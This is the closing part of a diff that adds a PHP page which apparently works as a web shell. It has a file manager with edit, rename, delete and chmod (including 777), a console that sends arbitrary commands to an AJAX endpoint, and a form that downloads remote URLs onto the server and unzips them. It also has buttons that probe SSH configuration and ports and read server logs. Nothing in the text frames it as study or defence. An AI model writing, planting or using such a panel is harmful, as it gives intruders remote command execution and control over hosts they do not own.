+            <button type="submit" name="rename_item" value="1" class="btn btn-warning"><i class="fas fa-check"></i> Rename</button>
+        </form>
+    </div>
+</div>
+
+<div id="deleteModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('deleteModal')">&times;</span>
+        <h3><i class="fas fa-exclamation-triangle" style="color:#ef5350;"></i> Confirm Delete</h3>
+        <p style="color:rgba(255,255,255,0.6);">Are you sure you want to delete <strong id="delete_item_name" style="color:#ef5350;"></strong>?</p>
+        <form method="post">
+            <input type="hidden" name="delete_item" id="delete_item_input">
+            <button type="submit" class="btn btn-danger"><i class="fas fa-trash"></i> Yes, Delete</button>
+            <button type="button" onclick="closeModal('deleteModal')" class="btn btn-primary">Cancel</button>
+        </form>
+    </div>
+</div>
+
+<div id="chmodModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal('chmodModal')">&times;</span>
+        <h3><i class="fas fa-lock"></i> Change Permission</h3>
+        <form method="post">
+            <input type="hidden" name="chmod_path" id="chmod_modal_path">
+            <div class="form-group">
+                <label>File/Folder:</label>
+                <span id="chmod_modal_name" style="color:#e0e4f0;font-weight:500;"></span>
+            </div>
+            <div class="form-group">
+                <label>Permission:</label>
+                <select name="chmod_perm">
+                    <option value="644">644 (rw-r--r--)</option>
+                    <option value="755">755 (rwxr-xr-x)</option>
+                    <option value="777">777 (rwxrwxrwx) ⚠️</option>
+                    <option value="600">600 (rw-------)</option>
+                    <option value="664">664 (rw-rw-r--)</option>
+                    <option value="775">775 (rwxrwxr-x)</option>
+                </select>
+            </div>
+            <button type="submit" name="chmod_single" value="1" class="btn btn-cyan">
+                <i class="fas fa-lock"></i> Change Permission
+            </button>
+        </form>
+    </div>
+</div>
+
+<script>
+function showTab(id) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+    document.getElementById('tab-' + id).classList.add('active');
+    if (event && event.target) {
+        event.target.closest('.tab').classList.add('active');
+    }
+}
+
+function openModal(id) {
+    document.getElementById(id).style.display = 'flex';
+}
+
+function closeModal(id) {
+    document.getElementById(id).style.display = 'none';
+}
+
+function editFile(filename) {
+    document.getElementById('edit_file_path').value = filename;
+    fetch('?path=<?php echo urlencode($current_path); ?>&file=' + encodeURIComponent(filename) + '&get_content=1')
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById('edit_file_content').value = data;
+            openModal('editModal');
+        })
+        .catch(() => alert('Failed to load file content'));
+}
+
+function renameItem(oldname) {
+    document.getElementById('rename_old_name').value = oldname;
+    document.getElementById('rename_new_name').value = oldname;
+    openModal('renameModal');
+}
+
+function deleteItem(filename) {
+    document.getElementById('delete_item_name').textContent = filename;
+    document.getElementById('delete_item_input').value = filename;
+    openModal('deleteModal');
+}
+
+function chmodItem(filename, default_perm) {
+    document.getElementById('chmod_modal_path').value = filename;
+    document.getElementById('chmod_modal_name').textContent = filename;
+    var sel = document.querySelector('#chmodModal select[name="chmod_perm"]');
+    if (default_perm) sel.value = default_perm;
+    openModal('chmodModal');
+}
+
+// ========== COMMAND - AUTO CLEAR ==========
+function runCommandAndClear(form) {
+    var cmd = document.getElementById('cmd_input').value;
+    if (!cmd) return false;
+    
+    var resultDiv = document.getElementById('cmd_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Running: ' + cmd + '\n\n';
+    
+    document.getElementById('cmd_input').value = '';
+    
+    fetch('?ajax=command&cmd=' + encodeURIComponent(cmd))
+        .then(response => response.text())
+        .then(data => {
+            resultDiv.innerHTML = '💻 Command: ' + cmd + '\n' + '='.repeat(50) + '\n\n' + data;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = '❌ Error: ' + error;
+        });
+    
+    return false;
+}
+
+function setCmdAndRun(cmd) {
+    document.getElementById('cmd_input').value = cmd;
+    var resultDiv = document.getElementById('cmd_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Running: ' + cmd + '\n\n';
+    
+    document.getElementById('cmd_input').value = '';
+    
+    fetch('?ajax=command&cmd=' + encodeURIComponent(cmd))
+        .then(response => response.text())
+        .then(data => {
+            resultDiv.innerHTML = '💻 Command: ' + cmd + '\n' + '='.repeat(50) + '\n\n' + data;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = '❌ Error: ' + error;
+        });
+}
+
+// ========== DOWNLOAD - AUTO CLEAR ==========
+function runWgetAndClear(form) {
+    var url = document.getElementById('wget_url').value;
+    var filename = document.getElementById('wget_filename').value;
+    if (!url) { alert('Please enter URL!'); return false; }
+    
+    var resultDiv = document.getElementById('download_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Downloading: ' + url + '\n\n';
+    
+    document.getElementById('wget_url').value = '';
+    if (document.getElementById('wget_filename')) {
+        document.getElementById('wget_filename').value = '';
+    }
+    
+    var formData = new FormData();
+    formData.append('wget_download', '1');
+    formData.append('wget_url', url);
+    formData.append('wget_filename', filename);
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+        var temp = document.createElement('div');
+        temp.innerHTML = html;
+        var msg = temp.querySelector('.message');
+        if (msg) {
+            resultDiv.innerHTML = msg.innerText;
+        } else {
+            resultDiv.innerHTML = '✅ Download completed!';
+        }
+        location.reload();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '❌ Error: ' + error;
+    });
+    
+    return false;
+}
+
+function runUnzipAndClear(form) {
+    var file = document.getElementById('unzip_path').value;
+    var target = document.getElementById('unzip_target').value;
+    if (!file) { alert('Please enter file name!'); return false; }
+    
+    var resultDiv = document.getElementById('download_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Extracting: ' + file + '\n\n';
+    
+    document.getElementById('unzip_path').value = '';
+    if (document.getElementById('unzip_target')) {
+        document.getElementById('unzip_target').value = '';
+    }
+    
+    var formData = new FormData();
+    formData.append('unzip_file', '1');
+    formData.append('unzip_path', file);
+    formData.append('unzip_target', target);
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+        var temp = document.createElement('div');
+        temp.innerHTML = html;
+        var msg = temp.querySelector('.message');
+        if (msg) {
+            resultDiv.innerHTML = msg.innerText;
+        } else {
+            resultDiv.innerHTML = '✅ Extract completed!';
+        }
+        location.reload();
+    })
+    .catch(error => {
+        resultDiv.innerHTML = '❌ Error: ' + error;
+    });
+    
+    return false;
+}
+
+// ========== LOG FUNCTIONS ==========
+function viewLog(domain_path) {
+    var path = domain_path || document.getElementById('log_domain_path').value;
+    var lines = document.getElementById('log_lines').value;
+    var filter = document.getElementById('log_filter').value;
+    
+    if (!path) { alert('Please enter domain path!'); return; }
+    
+    var resultDiv = document.getElementById('log_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Loading log...\n\n';
+    
+    var url = '?ajax=log_view&path=' + encodeURIComponent(path) + '&lines=' + lines;
+    if (filter) url += '&filter=' + encodeURIComponent(filter);
+    
+    fetch(url)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function viewAggregatedLog() {
+    var resultDiv = document.getElementById('log_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Loading aggregated logs...\n\n';
+    var lines = document.getElementById('log_lines').value;
+    
+    fetch('?ajax=log_aggregate&lines=' + lines)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function monitorChanges() {
+    var resultDiv = document.getElementById('monitor_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Scanning for changes...\n\n';
+    var minutes = 10;
+    
+    fetch('?ajax=log_monitor&minutes=' + minutes)
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function monitorDomain(domain_path) {
+    document.getElementById('log_domain_path').value = domain_path;
+    viewLog(domain_path);
+}
+
+// ========== SSH FUNCTIONS ==========
+function runSSHDetect() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Scanning for SSH...\n\n';
+    
+    fetch('?ajax=ssh_detect')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function runSSHConfig() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Reading SSH config...\n\n';
+    
+    fetch('?ajax=ssh_config')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+function runSSHPort() {
+    var resultDiv = document.getElementById('ssh_result');
+    resultDiv.style.display = 'block';
+    resultDiv.innerHTML = '⏳ Checking SSH port...\n\n';
+    
+    fetch('?ajax=ssh_port')
+        .then(response => response.text())
+        .then(data => { resultDiv.innerHTML = data; })
+        .catch(error => { resultDiv.innerHTML = '❌ Error: ' + error; });
+}
+
+// Close modal on outside click
+window.onclick = function(event) {
+    if (event.target.classList.contains('modal')) {
+        event.target.style.display = 'none';
+    }
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+    }
+});
+
+// Auto-load current domain path for log
+document.addEventListener('DOMContentLoaded', function() {
+    var currentPath = '<?php echo addslashes($current_path); ?>';
+    document.getElementById('log_domain_path').value = currentPath;
+});
+</script>
+
+<?php
+// Handle file content fetch for editor
+if (isset($_GET['get_content']) && isset($_GET['file'])) {
+    $file = $current_path . '/' . basename($_GET['file']);
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Type: text/plain');
+        echo file_get_contents($file);
+    }
+    exit;
+}
+?>
+
+</body>
+</html>
